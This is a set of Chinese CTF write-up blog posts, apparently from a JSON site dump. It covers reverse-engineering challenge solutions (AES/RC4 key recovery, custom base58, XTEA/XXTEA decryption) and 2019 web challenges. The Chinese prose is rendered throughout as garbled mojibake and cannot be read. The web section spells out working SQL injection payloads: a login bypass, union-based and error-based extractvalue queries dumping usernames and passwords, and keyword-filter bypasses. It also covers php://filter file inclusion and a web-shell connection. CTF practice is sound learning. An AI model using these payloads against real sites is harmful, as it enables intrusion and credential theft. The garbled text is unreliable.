ï¼Œè¿™æ¬¡ç®—æ˜¯é‡åˆ°äº†ã€‚ã€‚çœ‹äº†å¾ˆä¹…éƒ½æ²¡æœ‰çœ‹å‡ºæ¥ï¼Œæœ€åçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpæ‰å‡ºæ¥çš„ã€‚å…¶å®è¿™é“é¢˜çŸ¥é“äº†md5å’Œsha256ä¹‹ååŠ å¯†è¿‡ç¨‹å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°é‚£å°±æ¼ç«äº†ï¼ˆæ¯”å¦‚åƒæˆ‘ï¼‰ æ€»å…±ç®—ä¸‹æ¥è¿™é“é¢˜ä¸€å…±æœ‰5ä¸ªæ­¥éª¤ å­—ç¬¦ä¸²è½¬16è¿›åˆ¶ æ‰“ä¸ªæ¯”æ–¹ï¼šæ¯”å¦‚æˆ‘ä»¬è¾“å…¥123456ï¼Œé‚£ä¹ˆç¨‹åºä¼šå°†æˆ‘ä»¬è¾“å…¥çš„è½¬ä¸º 12 23 45è¿™ä¸‰ä¸ª16è¿›åˆ¶æ•°è¿›è¡Œä¿å­˜ï¼Œå› æ­¤å‰é¢åªå…è®¸è¾“å…¥0-9 a-fçš„å­—ç¬¦ ä½è¿ç®— æ€»ä½“å‘å‰ç§»åŠ¨äº†ä¸‰ä½ï¼ˆæˆ‘æ€€ç–‘è¿™æ¬¡çš„é¢˜æ˜¯ä¸€ä¸ªäººå‡ºçš„ï¼ŒåŠ å¯†ç®—æ³•éƒ½å¥½ç›¸ä¼¼ã€‚ã€‚ï¼‰ è®¡ç®—keyå’Œiv rc4å’ŒAES æ³¨æ„AESæ˜¯è§£å¯†ï¼Œé¢˜ç›®ç”¨çš„æ˜¯Resç›’å­ï¼Œå¹¶ä¸æ˜¯å¸¸è§„çš„Sç›’å­ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™è„šæœ¬çš„æ—¶å€™æ˜¯åŠ å¯† 5.ä¸ç”¨md5ç”Ÿæˆçš„åºåˆ—æ¯”è¾ƒ å¦‚æœåºåˆ—å·æ¯”å¯¹æˆåŠŸï¼Œç¨‹åºå°±ä¼šè¯»å–flag.encä¸­çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œæˆ‘ä»¬è¾“å…¥ç„¶åé€šè¿‡åŠ å¯†è®¡ç®—å¾—åˆ°çš„åºåˆ—å·å°±ä¼šä½œä¸ºkeyè§£å¯†flag.encçš„äºŒè¿›åˆ¶æ•°æ®æµï¼ŒåŒæ ·ä¹Ÿæ˜¯AES CBCæ¨¡å¼ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†ä¸ç”¨æˆ‘ä»¬å…³å¿ƒï¼Œæˆ‘ä»¬åªéœ€è¦å¾—åˆ°æ­£ç¡®çš„åºåˆ—å·å°±å¯ä»¥äº† 123456789101112131415161718192021222324252627282930313233343536import hashlibimport binasciifrom Cryptodome.Cipher import AES,ARC4flag = &#x27;&#x27;string = b&#x27;admin&#x27;new_res = [0x8c]Plain_AES = binascii.unhexlify(hashlib.md5(string).hexdigest())digest = hashlib.sha256(string).hexdigest()res = [i for i in binascii.unhexlify(digest)]for i in range(1,32): new_res.append(res[i] ^ res[i - 1])# aesåŠ å¯†key = binascii.a2b_hex((bytes(new_res).hex()[:32]).encode())iv = binascii.a2b_hex((bytes(new_res).hex()[32:]).encode())aes = AES.new(key, AES.MODE_CBC, iv)Cipher_AES = aes.encrypt(Plain_AES)# rc4åŠ å¯†rc4_cipher = Cipher_AESrc4 = ARC4.new(key)rc4_plain = rc4.decrypt(rc4_cipher)print(rc4_plain)# ä½è¿ç®—big_num_hex = binascii.hexlify(rc4_plain)big_num_bin = bin(int(big_num_hex, 16))[2:].rjust(16*8,&#x27;0&#x27;)big_num_bin = big_num_bin[3:] + big_num_bin[:3]for i in range(16): flag += hex(int(big_num_bin[i*8:i*8+8],2))[2:].rjust(2,&#x27;0&#x27;)print(flag)# 653b987431e5a2fc7c3d748fba008869 å¤ç°æ€»ç»“ å¸¸è§çš„åŠ å¯†ç®—æ³•ç‰¹å¾ä¸æ¸…æ¥šï¼ˆå¤§é—®é¢˜ï¼‰ çœ‹æ±‡ç¼–ä¸ä»”ç»†ï¼ˆéœ€è¦æ”¹æ‰è‡ªå·±ç²—å¿ƒçš„æ¯›ç—…ï¼‰ windowsæ–¹é¢çŸ¥è¯†è¿˜æ˜¯ä¸å¤Ÿ é¢˜å‹è§å¾—å¤ªå°‘äº†ï¼Œæ„Ÿè§‰åšäº†ä¸€é“é¢˜å°±ç´¯çš„è¦æ­»ğŸ˜‘ï¼ŒçœŸçš„ä½©æœæ¯”èµ›ä»å¼€å§‹è‚åˆ°æœ€åçš„å¸ˆå‚…ä»¬ å­¦ä¹ äº†æ€ä¹ˆä½¿ç”¨Cryptdomeåº“ï¼Œwindowsçš„å‡ ç§åè°ƒè¯•ï¼ˆå¼‚å¸¸æ³¨å†Œï¼Œdebug bloker)ï¼Œä¸‹æ¬¡åœ¨é‡åˆ°å°±ä¸ä¼šè¿™ä¹ˆç—›è‹¦äº†å§ï¼ˆå¤§æ¦‚ï¼‰","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"2019æå®¢å¤§æŒ‘æˆ˜web","slug":"CTF/wp/æå®¢å¤§æŒ‘æˆ˜2019","date":"2021-07-14T04:44:17.040Z","updated":"2021-08-08T09:30:32.837Z","comments":true,"path":"6345/","link":"","permalink":"http://example.com/6345/","excerpt":"","text":"[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQLä¸‡èƒ½å¯†ç ç›´æ¥å‡º 11&#x27; and &#x27;1&#x27; = &#x27;1 [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL é¦–å…ˆæŸ¥å‡ºå•å¼•å·æŠ¥é”™ å°è¯•ç”¨ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªæ— ç”¨çš„å€¼ï¼ŒCMD5ç½‘ç«™ä¹Ÿæ— æ³•ç ´è§£ï¼Œå°è¯•å…¶ä»–æ–¹æ³• å°è¯•ä¸­æ–­æ³¨å…¥ï¼Œè”åˆæ³¨å…¥æŸ¥çœ‹å…¶ä»–ä¿¡æ¯å¯ä»¥çœ‹åˆ°ç”¨åˆ°äº†æŸ¥è¯¢çš„ç¬¬2ï¼Œ3ä¸ªå­—æ®µ 11&#x27; and 1=2 union select 1,2,3 # è·å–å½“å‰æ•°æ®åº“åï¼Œå›æ˜¾å‡ºå½“å‰æ•°æ®åº“åä¸ºgeek 11&#x27; and 1=2 union select 1,database(),version() # æŸ¥è¯¢æ•°æ®åº“é‡Œé¢çš„è¡¨åç§° 12345# æŸ¥è¯¢æ‰€æœ‰è¡¨åselect table_name from information_schema.tables where table_schema = &#x27;database_name&#x27;# æŸ¥è¯¢æ‰€æœ‰åˆ—åselect column_name from information_schema.columns where table_name= &#x27;è¡¨å&#x27; and table_schema= &#x27;æ•°æ®åº“å&#x27; è¿™é‡Œéœ€è¦åŠ ä¸Šlimité™åˆ¶è¿”å›çš„åˆ—æ•°ï¼Œæ‰‹å·¥æŸ¥å‡ºgeekæ•°æ®åº“ä¸‹åªæœ‰ä¸¤ä¸ªè¡¨ï¼šgeekuserå’Œl0ve1ysq1 11&#x27; and 1=2 union select 1,2,table_name from information_schema.tables where table_schema = &#x27;geek&#x27; limit 0,1 # æŸ¥è¯¢è¡¨çš„åˆ—åï¼Œæˆ‘å½“æ—¶æ˜¯ä¸€ä¸ªä¸€ä¸ªæŸ¥çš„ï¼Œçœ‹åˆ«äººwpå‘ç°å¯ä»¥ä¸€æ¬¡å°±å…¨éƒ¨æŸ¥å‡ºæ¥ã€‚ã€‚æŸ¥å‡ºä¸‰ä¸ªåˆ—åç§° 1select column_name from information_schema.columns where table_name= &#x27;è¡¨å&#x27; and table_schema= &#x27;æ•°æ®åº“å&#x27; 11&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; è·å–æ•°æ®åº“ä¸­ä¿¡æ¯ æˆ‘å…ˆæ˜¯æ‰‹å·¥æŸ¥ï¼Œåé¢åŠ äº†ä¸€ä¸ªwhereè¯­å¥æ¡ä»¶å°±ç›´æ¥å‡ºäº†ã€‚ã€‚è¿æ°”å¥½ï¼Œç½‘ä¸Šå¸ˆå‚…wpéƒ½æ˜¯æŠŠè¡¨ä¸­çš„æ•°æ®å…¨éƒ¨è¡ä¸‹æ¥ã€‚å­¦ä¹ ä¸€æ‰‹ 11&#x27; and 1=2 union select 1,username,password from l0ve1ysq1 where username = &#x27;flag&#x27; # ç½‘ä¸Šå¸ˆå‚…çš„åšæ³•ï¼Œå¯¹mysqlä¸­çš„å‡½æ•°ä¸€ç‚¹éƒ½ä¸ç†Ÿæ‚‰ï¼Œè¾¹sqliè¾¹å­¦mysqlå‡½æ•°å§ã€‚ã€‚ 11&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.l0ve1ysq1 # [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLè€ƒç‚¹ï¼šç»•è¿‡ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ è¿‡æ»¤äº†or,and,select,union,fromè¿™äº›å…³é”®å­—ï¼Œç”¨æ‰€æœ‰å…³é”®å­—ç”¨åŒå†™ç»•è¿‡ï¼Œè¿‡ç¨‹å’ŒLoveSQLè¿‡ç¨‹ä¸€æ · [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLè€ƒç‚¹ï¼šSQLæŠ¥é”™æ³¨å…¥ è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç­‰å·ï¼Œunionï¼Œandç­‰å­—ç¬¦ï¼Œä¸»è¦éš¾ç‚¹åœ¨äºç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼Œéœ€è¦ç”¨æ‹¬å·æ¥ç»•è¿‡ çˆ†åº“ 1username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(database()))))%23 çˆ†è¡¨ 1username=123&amp;password=1&#x27;^extractvalue(1,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%23 çˆ†å­—æ®µå 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23 æŸ¥flag éœ€è¦ç”¨leftå’Œrightåˆ†åˆ«æŸ¥å·¦è¾¹å’Œå³è¾¹ï¼Œç„¶åä¸ªflagæ‹¼æ¥ 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(left(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23 1username=123&amp;password=1%27^extractvalue(1,concat(0x5e,(select(right(password,30))from(H4rDsq1)where(username)like(&#x27;flag&#x27;))))%23 1flag&#123;c36b7fc4-a9fe-4d02-97c6-d3c8b35ead69&#125; [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQLSQLç›²æ³¨ [æå®¢å¤§æŒ‘æˆ˜ 2019]Secret Fileè€ƒç‚¹ï¼šæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ŒPHPä¼ªåè®® æŠ“åŒ…æŠ“åˆ°ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œè®¿é—®ç›®å½•æŸ¥çœ‹ æŸ¥çœ‹ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯è®¿é—®flag.phpå´ä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ä½¿ç”¨php://filteråè®®å¯¹æ–‡ä»¶è¿›è¡Œbase64ç¼–ç æŸ¥çœ‹ 1è®¿é—®åç¼€ï¼šsecr3t.php?file=php://filter/convert.base64-encode/resource=flag.php flag.phpä¸­çš„å†…å®¹å…¨éƒ¨ä»¥base64ç¼–ç çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çº¿è§£ç å¾—åˆ°flag 1PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MWZkYzRlMDItODU1MS00ZTY3LThkNzUtZmY3ZDkzZDJmNjg5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= [æå®¢å¤§æŒ‘æˆ˜ 2019]Knifeä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥ç”¨èšå‰‘è¿æ¥ç½‘ç«™åå°ï¼Œflagåœ¨æ ¹ç›®å½• [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPè€ƒå¯Ÿç½‘ç«™å¸¸ç”¨å¤‡ä»½åç¼€åï¼ŒPHPçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ– é¦–å…ˆæç¤ºäº†ç½‘ç«™å¤‡ä»½ï¼Œç”¨å¸¸ç”¨çš„ç½‘ç«™å¤‡ä»½å­—å…¸çˆ†ç ´ï¼Œçˆ†ç ´å‡ºwww.zipï¼Œåœ¨åç¼€è¾“å…¥ä¸‹è½½ [æå®¢å¤§æŒ‘æˆ˜ 2019]HttpHTTPå¤´éƒ¨ä¼ªé€ ï¼Œæ¯”è¾ƒè¿‡ç¨‹æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯éœ€è¦å­¦ä¹ HTTPåè®® /sbin/nologin","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"web","slug":"CTF/web","permalink":"http://example.com/categories/CTF/web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"çº¢æ˜è°·/è™ç¬¦CTF-reé¢˜è§£","slug":"CTF/wp/çº¢åè°·-è™ç¬¦CTF","date":"2021-07-14T04:44:17.040Z","updated":"2021-08-08T09:16:23.559Z","comments":true,"path":"5429/","link":"","permalink":"http://example.com/5429/","excerpt":"","text":"çº¢æ˜è°·-g0çœ‹åå­—å°±æ˜¯goè¯­è¨€é¢˜ç›®ï¼Œç”¨IDA-golang-helperè¿˜åŸç¬¦å·è¡¨ä¹‹åï¼Œçœ‹åˆ°åªæœ‰å‡ ä¸ªå‡½æ•°ï¼Œå…¶ä¸­main_Encodeå°±æ˜¯åŠ å¯†å‡½æ•° å‡½æ•°é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œè¾“å…¥é•¿åº¦ç­‰äº20ï¼Œæ‰“ä¹±ä½ç½®ï¼Œè¿›å…¥main_EncodeåŠ å¯†ï¼Œæœ€åè¿›å…¥main_fun1è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥çœ‹main_Encodeä¸­çš„åŠ å¯†ç®—æ³• åŠ¨æ€è°ƒè¯•åå‘ç°ä¸€å¼ è¡¨ï¼Œè¡¨çš„é•¿åº¦ä¸º58ä½ï¼Œåˆ¤æ–­ä¸ºæ¢è¡¨base58åŠ å¯† è¿›å…¥main_fun1å‡½æ•°ä¸­æ‰¾åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œæ³¨æ„ runtime_memequalè¿™ä¸ªæ¯”è¾ƒçš„å‡½æ•°éœ€è¦åœ¨æ±‡ç¼–ä¸­å¯»æ‰¾æ¯”è¾ƒçš„å­—ç¬¦ä¸²é¦–åœ°å€ï¼Œåœ¨ä¼ªä»£ç ä¸­æ˜¯æ‰¾ä¸åˆ°çš„ 123456789101112import base58Cipher = &#x27;2GVdudkYo2CBXoQii7gfpkjTc4gT&#x27;Plain = &#x27;&#x27;new_table = &#x27;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#x27;old_table = &#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;for i in range(len(Cipher)): Plain += old_table[new_table.index(Cipher[i])]print(base58.b58decode(Plain.encode()))# flag&#123;We1CTFc0m_2345&#125; è™ç¬¦-remipsæ¶æ„æ–‡ä»¶ï¼Œæœ¬æ¥æƒ³ç”¨qemuåŠ¨æ€è°ƒè¯•çš„ï¼Œä½†æ˜¯å¥½åƒè™šæ‹Ÿæœºçš„soæ–‡ä»¶å‡ºé—®é¢˜äº†ï¼Œå°±é™æ€åˆ†æç®—äº†ï¼Œåæ­£æœ‰IDA7.5ä¸æ€• çœ‹ä¼ªä»£ç å¾ˆæµ“åšçš„C++æ°”æ¯ï¼Œä¸¤æ¬¡åˆ¤æ–­ï¼Œpreå‡½æ•°é‡Œé¢è¿˜åˆ¤æ–­äº†è¾“å…¥çš„é•¿åº¦ server_check_redemption_codeå‡½æ•°å¤§æ¦‚çš„æ„æ€å°±æ˜¯ç”Ÿæˆä¸€å¼ å®½256é•¿å’Œå­—ç¬¦ä¸²é•¿åº¦ç›¸åŒçš„è¡¨ï¼Œå½“è¡¨çš„åˆ—å€¼ä¸è¾“å…¥çš„å­—ç¬¦ä¸²çš„ASCIIå€¼ç›¸åŒæ—¶å°±åšä¸€ä¸ªæ ‡è®°ï¼Œç”¨Cè¯­è¨€è¿˜åŸåçš„ä»£ç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char string[] = &quot;&quot;; char input[] = &quot;&quot;; int string_len = strlen(string); int input_len = strlen(input); int* s = (int*)malloc(input_len &lt;&lt; 10);// input_len * 2^10 memset((void*)s, 0, input_len &lt;&lt; 10); int count = 0; for (int i = 1; i &lt; input_len; i++) &#123; for (int j = 0; j &lt; 256; j++) &#123; if (j != input[i]) &#123; s[256 * i + j] = s[256 * count + j]; //å…¶ä»–å…¨æ˜¯å¡«å……è¿™ä¸ª &#125; else s[256 * i + j] = i + 1; //æ¯ä¸€æ¬¡å¾ªç¯åªæ‰§è¡Œä¸€æ¬¡è¿™ä¸ª &#125; count = s[256 * count + input[i]]; //count=i+1 &#125; int sign = 0; for (int k = 0; k &lt; string_len; k++) &#123; sign = s[256 * sign + string[k]]; if (sign == input_len) &#123; printf(&quot;%d&quot;, k - input_len + 1); &#125; &#125;&#125; /// k-input_len+1=7 /// k=6+0xE= é¢˜ç›®ä¸­æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ç”Ÿæˆäº†ä¸¤å¼ è¡¨ï¼Œä¸¤å¼ è¡¨ä¸­ç›¸åŒçš„å€¼å°±æ˜¯éœ€è¦è¾“å…¥çš„flag Ninja Must Die 3 Is A Cruel Game, So Hard For Me I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative. ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­ç›¸åŒçš„å€¼ä¸ºNinja Must Die è™ç¬¦-gocryptå˜ç§çš„xteaåœ¨å†™è„šæœ¬çš„æ—¶å€™å¿˜è®°äº†å°ç«¯å­˜å‚¨ï¼Œè¿™ä¸ªåœ°æ–¹æäº†å¾ˆä¹…ï¼Œä»¥åé‡åˆ°ä¸èƒ½åœ¨çŠ¯é”™è¯¯äº† ç”¨æ’ä»¶è¿˜åŸç¬¦å·è¡¨åçœ‹åˆ°å‡½æ•°å¹¶æ²¡æœ‰å¤šå°‘ï¼Œè¾“å…¥æ£€æµ‹å‡½æ•°main_checkï¼Œæ•°æ®åŠ å¯†å‡½æ•°main_main__ptr_myCipher_Encrypt main_checkå‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…æ¥è§„å®šflagè¾“å…¥çš„æ ¼å¼ 1æ­£åˆ™åŒ¹é…æ ¼å¼ï¼šflag&#123;([0-9a-f]&#123;8&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;12&#125;)&#125; åœ¨è¿›å…¥main_checkè¿”å›ä¸€ä¸ªå€¼ç»™æ ‡å¿—ï¼Œåˆ¤æ–­æ˜¯å¦è¿›å…¥ä¸‹ä¸€ä¸ªæ­¥éª¤ main__ptr_myCipher_Encryptå‡½æ•°ä¸­çš„åŠ å¯†ç®—æ³•å°±æ˜¯å˜ç§çš„xteaåŠ å¯†ï¼Œéšæœºæ•°å˜æˆäº†0x12345678 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void XTEA_decrypt(uint32_t rounds, uint32_t* v, uint32_t* k)&#123; uint32_t delta = 0x12345678; uint32_t sum = rounds * delta; uint32_t v0 = v[0], v1 = v[1]; for (int i = 0; i &lt; rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + k[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + k[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; uint32_t rounds = 32; uint32_t v[2][2] = &#123; &#123; 0x0ec311f0, 0x45c79af3 &#125;, &#123; 0xedf5d910, 0x542702cb &#125; &#125;; uint32_t k[4] = &#123; 0x00010203, 0x04050607, 0x08090a0b, 0x0c0d0e0f &#125;; XTEA_decrypt(rounds, v[0], k); XTEA_decrypt(rounds, v[1], k); printf(&quot;%x-%x\\n&quot;, v[0][0], v[0][1]); printf(&quot;%x-%x\\n&quot;, v[1][0], v[1][1]);&#125;//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125; è™ç¬¦-CrackMeè¿™ä¸ªé¢˜éœ€è¦è¾“å…¥ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡è¾“å…¥ååˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé•¿åº¦éœ€è¦17ä½ï¼Œè¾“å…¥åå°†è¾“å…¥çš„å­—ç¬¦ä¸²çš„å‰7ä½å’Œå10ä½åˆ†å‰²ï¼Œåˆ†åˆ«å­˜å‚¨åœ¨ä¸åŒçš„å†…å­˜ä¸­ ç¬¬äºŒæ¬¡è¾“å…¥éœ€è¦è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œåœ¨ç»è¿‡ä¸¤è½®ç®€å•çš„è®¡ç®—åä¸æŒ‡å®šçš„ä¸¤ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥å†™è„šæœ¬çˆ†ç ´ï¼Œæœ€åè®¡ç®—å‡ºéœ€è¦è¾“å…¥çš„å€¼ä¸º90038 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// çˆ†ç ´è„šæœ¬ï¼Œå•çº¿ç¨‹å¤§æ¦‚éœ€è¦åŠä¸ªå°æ—¶å·¦å³#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt; double cal(double a, double b)&#123; double _a; double var = 0.0; _a = a; a = pow(a, b - 1); *(&amp;var + 1) = *(&amp;a + 1); var = a / exp(_a); return var;&#125;int main(int argc, char* argv[])&#123; double input_num; for (int i = 0; i &lt; 99999; i++) &#123; input_num = i; printf(&quot;%d\\n&quot;, i); double v16 = 0.0, v17 = 0.0, v18 = 0.0, v19 = 0.0; int num1 = 0x13B03, num2 = 0x5A2; v19 = (double)((int)input_num / 0x305B) + 1.0; do &#123; v17 = v17 + cal(v18, v19) * 0.001; v18 = v18 + 0.001; &#125; while (v18 &lt;= 100.0); double v21 = 0.0; double v22 = (double)((int)input_num % 0x305B) + 1.0; do &#123; v16 = v16 + cal(v21, v22) * 0.001; v21 = v21 + 0.001; &#125; while (v21 &lt;= 100.0); if ((int)(v17 + v17 + 3.0) == num1 &amp;&amp; (int)(v16 + v16 + 3.0) == num2) &#123; printf(&quot;%f&quot;, input_num); break; &#125; &#125; return 0;&#125; åé¢å°±æ¯”è¾ƒç®€å•äº†ï¼Œé¦–å…ˆå°†è¾“å…¥çš„æ•°å­—è½¬ä¸ºasciiç ï¼Œç„¶ååœ¨åé¢è¿½åŠ input_num*2ï¼Œä¸€å…±è¿½åŠ 5æ¬¡ï¼Œå–å‰7ä½è¿›è¡Œå¼‚æˆ–è®¡ç®—å‡ºä¸€ä¸ªkeyä¾›åé¢ä½¿ç”¨ 123456Cipher = [8, 77, 89, 6, 115, 2, 64]key = list(map(ord,list(&quot;9903819&quot;)))Plain = bytes(key[i]^Cipher[i] for i in range(7))print(Plain)# 1ti5K3y åé¢å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„RC4åŠ å¯† 12345678from Cryptodome.Cipher import ARC4Cipher = bytes([178, 214, 142, 63, 170, 20, 83, 84, 198, 6])Key = b&#x27;1ti5K3y&#x27;rc4 = ARC4.new(Key)Plain = rc4.decrypt(Cipher)print(Plain)# RC4_crypt0","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"re","slug":"CTF/re","permalink":"http://example.com/categories/CTF/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"hgame2021-reéƒ¨åˆ†é¢˜è§£","slug":"CTF/wp/HGAME","date":"2021-07-14T04:44:17.030Z","updated":"2021-08-08T09:16:01.509Z","comments":true,"path":"63316/","link":"","permalink":"http://example.com/63316/","excerpt":"","text":"å‰è¨€hgame 2021çš„é€†å‘éƒ¨åˆ†é¢˜è§£ï¼Œä¸€é“ncé¢˜å’Œä¸€é“å®‰å“é€†å‘æ²¡æœ‰åšï¼Œæ¯å‘¨çš„é¢˜ç›®éƒ½çœ‹äº†çœ‹ï¼Œåšäº†å››åˆ†ä¹‹ä¸‰å·¦å³ï¼Œæ­ç”µçš„æ¯”èµ›é¢˜ç›®å‡ºå¾—å¾ˆæœ‰æ°´å¹³ï¼Œè‡ªå·±å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œwpæœ¬æ¥è¯´æ¯å‘¨éƒ½å†™çš„ï¼Œä½†æ˜¯æ‡’ï¼Œæ¯”èµ›éƒ½ç»“æŸä¸€ä¸ªæœˆäº†æ‰å·å·¥å‡æ–™å¾—å†™å‡ºæ¥ã€‚æœ‰å…´è¶£çš„å¸ˆå‚…å‡‘åˆç€çœ‹çœ‹å§å§ğŸ¤ª RE-week1ä¸€æ¯é˜¿å¸•èŒ¶æ˜æ˜¾çš„TEAåŠ å¯†æ ‡å¿—ï¼Œåé¢åˆ†æä¸ºXXTEAåŠ å¯† åŠ å¯†åçš„æ•°æ®ï¼Œåˆšå¥½35ä½ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5 ^ y&lt;&lt;2) + (y&gt;&gt;3 ^ z&lt;&lt;4)) ^ ((sum ^ y) + (k[(p&amp;3) ^ e] ^ z)))void XXTEA(int n, uint32_t* v, uint32_t* k)&#123; uint32_t sum, y, z; uint32_t p, rounds, e; if (n &gt; 1) &#123; rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do &#123; sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) &#123; n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125;&#125;int main()&#123; uint32_t arr[] = &#123;3880694563, 3081185334, 1506439138, 2524759489, 3883935348, 1026381030, 2325545814, 2581382044, 1881594093, 1781792173, 4103492874, 1553756062, 468045900, 1730391575, 1383114178, 2890011402, 2227070898, 1885128569, 1548828056, 4214676013, 571971141, 1558401693, 3515474427, 3898332297, 1942540575, 1421197718, 3061626000, 555214026, 2648963476, 794468778, 2816999933, 3272437419, 464379036, 877899850, 